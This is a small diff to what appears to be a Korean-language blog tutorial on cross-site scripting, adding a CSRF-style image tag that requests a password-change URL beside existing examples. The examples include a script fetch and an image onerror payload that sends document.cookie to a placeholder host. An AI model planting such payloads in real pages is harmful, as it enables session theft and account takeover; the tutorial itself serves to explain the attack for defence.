@@ -27,6 +27,7 @@ permalink: /security/xss
 <p>안녕하세요.</p>
 <script>fetch(...)</script>
 <img src="X" onerror="this.src='http://xxx.xxx/?' + document.cookie;" />
+<img src="/change_password?pw=..." />
 ```
 
 이 데이터에 아무런 조치가 없다면\
